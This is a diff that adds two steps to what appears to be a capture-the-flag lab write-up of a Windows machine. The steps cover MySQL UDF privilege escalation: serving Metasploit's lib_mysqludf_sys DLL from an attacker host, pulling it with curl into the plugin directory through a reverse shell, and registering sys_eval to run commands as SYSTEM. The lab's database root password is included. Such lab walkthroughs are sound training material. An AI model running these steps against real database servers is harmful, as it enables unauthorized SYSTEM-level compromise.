@@ -885,6 +885,93 @@ root@localhost
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.7 Upload the UDF library to the plugin directory (Privilege Escalation)
+
+**Why this step:** With MySQL root and a writable plugin dir confirmed (4.6), place a 64-bit `lib_mysqludf_sys` DLL into the plugin directory so it can be loaded as a UDF.
+
+**Action (attacker, Kali):**
+
+```
+cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll ~/Labs/.../Touch/udf.dll
+# served over the existing python3 -m http.server 8000
+```
+
+**Action (victim, reverse shell):**
+
+```
+curl http://10.10.14.139:8000/udf.dll -o C:\MySQL\lib\plugin\udf.dll
+dir C:\MySQL\lib\plugin\udf.dll
+```
+
+**Breakdown:**
+
+|Component|Meaning|
+|---|---|
+|`cp ... lib_mysqludf_sys_64.dll udf.dll`|Use the prebuilt 64-bit UDF library (must match the 64-bit MySQL from 4.6).|
+|`curl ... -o C:\MySQL\lib\plugin\udf.dll`|Download it directly into MySQL's plugin directory, run inside the reverse shell (not on the attacker host).|
+|`dir ...`|Verify size matches the source (7168 bytes) to rule out truncation.|
+
+**Result:**
+
+```
+Directory: C:\MySQL\lib\plugin
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         10/4/2026   5:13 PM           7168 udf.dll
+```
+
+**What this gives you:** The UDF library staged in the plugin directory at the correct size. **Key finding:** the transfer command must execute in the target shell, not the attacker shell; a size match (7168 bytes) confirms an intact 64-bit DLL, avoiding the `errno 193` loading failure.
+
+**Next:** Register the UDF and execute a command to confirm SYSTEM.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.8 Register the UDF and execute as SYSTEM (Privilege Escalation)
+
+**Why this step:** With the DLL in the plugin dir (4.7), register its exported function so MySQL loads the library into `mysqld.exe` (SYSTEM) and exposes command execution.
+
+**Theory, for a first-timer: why this yields SYSTEM.** `CREATE FUNCTION ... SONAME 'udf.dll'` tells MySQL to load that DLL from the plugin directory and bind an exported symbol as a SQL function. Loading the library runs its code inside the `mysqld.exe` process, and that process runs as `NT AUTHORITY\SYSTEM` (4.3). The `lib_mysqludf_sys` library exports `sys_eval`, which runs an OS command and returns its output. So calling `sys_eval('<cmd>')` runs `<cmd>` as SYSTEM and hands you the output inline, no reverse shell required.
+
+**Command:**
+
+```
+C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "DROP FUNCTION IF EXISTS sys_eval; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';"
+C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
+```
+
+**Breakdown:**
+
+|Component|Meaning|
+|---|---|
+|`DROP FUNCTION IF EXISTS sys_eval`|Remove any prior registration to avoid an "already exists" error.|
+|`CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'`|Load `udf.dll` and bind `sys_eval`.|
+|`SELECT sys_eval('whoami')`|Run `whoami` as the MySQL process (SYSTEM) and return its output.|
+
+**Result:**
+
+```
+sys_eval('whoami')
+nt authority\system
+```
+
+**What this gives you:** Command execution as `NT AUTHORITY\SYSTEM` via MySQL. **Key finding:** the UDF loads and runs inside the SYSTEM-owned `mysqld.exe`, so `sys_eval` is an inline SYSTEM command primitive. Full compromise achieved.
+
+**Next:** Read the root flag using `sys_eval`.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
